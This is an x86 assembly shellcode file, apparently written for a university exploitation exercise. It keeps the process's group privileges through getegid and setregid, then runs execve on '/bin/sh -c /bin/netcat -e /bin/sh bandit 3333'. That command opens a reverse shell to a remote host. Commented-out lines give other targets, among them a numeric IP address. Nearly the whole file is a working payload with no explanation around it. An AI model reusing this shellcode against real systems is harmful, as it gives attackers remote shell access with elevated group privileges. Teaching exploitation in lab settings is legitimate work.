#	.file	"expl1b.c"
#	.section	.rodata
#	.align 4

#.data

#.text
#	.globl main
#	.type	main, @function

#create nops
#.rept 370
#     nop
#.endr

.data

.text
	.globl main
	.type main, @function
#.global getegid

main:
getegid:
	subl	%eax, %eax		#clear eax
	movb	$50, %al		#system call 50, getegid
	int		$0x80			

setregid:
	movl	%eax, %ebx		#set the groupid's
	movl 	%eax, %ecx 		#set the groupid's
	subl	%eax, %eax		#clear eax
	movb	$71, %al
	int		$0x80			#system call 71, setregid

jump:
	jmp		stringy			#need to jump to the 'call'

after_jump:

hello_world:
	sub		%eax, %eax
	sub		%ebx, %ebx
	sub		%edx, %edx
	movb	$4, %al
	movb 	$1, %bl
	mov		(%esp), %ecx
	movb	$10, %dl
	int 	$0x80	

execve_prepare:
	movl	(%esp), %ebx
	sub 	%eax, %eax		#clear eax
	sub		%ecx, %ecx		#clear ecx
	sub		%edx, %edx		#clear edx
	movb	$11, %al

	jmp after_string		#jump to after the string

add_zero:
	mov		(%esp), %edx	#move the address of the end of the string into edx
	mov		%ebx, %esi		#source pointer
	mov		%edx, %edi		#destination pointer
	#ebx and esi contain beginning, edx and edi the end of the string
	#actually edx is the byte after the call after the end of the string- oh well

	#ebx points to the start of the string, it is increased every loop
	#esi points to the start of the string, constant
	#edx points to the beginning of every new argument, changed sometimes
	#edi points to the end of the string, constant

	#eax is the current byte
	#ecx is empty
	sub		%ecx, %ecx

	#add the start of the string to the array
	mov		%ebx, (%edx)
	addb	$4,	%dl

add_zero_loop:
	cmp		%ebx, %edi		#see how far the loop has progressed		
	je		terminate_array	#if the whole string has been looped over, jump
	
	mov		(%ebx), %eax	#load the current word, but compare only the first byte
	cmp 	$0x90, %al 		#look for nops
	je 		really_add_zero	#if equal, replace byte with 0x00
	addb	$1, %bl			#increase pointer
	jmp		add_zero_loop	#if bytes not equal, loop again	

really_add_zero:
	movb 	%cl, (%ebx)		#add terminating zero
	addb	$1, %bl			#b++
	
	mov 	%ebx, (%edx)	#add start of string to array
	addb	$4, %dl			#

	jmp		add_zero_loop	#look at next char

terminate_array:
	mov 	%ecx, (%edx)	#add zero to terminate array

#do a loop that replaces 0xff with 0x00
#construct the array as defined below

do_execive:
	sub 	%eax, %eax
	movb	$11, %al		#eax: call code 11
	mov		%esi, %ebx		#ebx: filename
	mov		%edi, %ecx		#ecx: argv
	sub		%edx, %edx		#edx: envp, here empty
	int		$0x80			#system call 11, execve	string

	subl	%eax, %eax		#clear eax
	subl	%ebx, %ebx		#clear ebx
	movb	$1, %al
	int 	$0x80			#system call 1, exit

stringy:
	call 	after_jump		#jump back so that the string is in the %esp
#	.string	"/home/uebungen/dazur/dazur009/grad"
#	.string "/bin/grad"
#	.string "/bin/netcat -e /bin/sh 128.130.60.30 3333"
#	.string "/bin/netcat -e /bin/sh yourhost 3333"
	.string "/bin/sh"
	.string "-c"
#	.string "/bin/netcat -e /bin/sh localhost 3333"
	.string "/bin/netcat -e /bin/sh bandit 3333"
after_string:
	call add_zero

#array: 4byte *programm name, 4byte *element1, 4byte *element2, 4byte 0x00
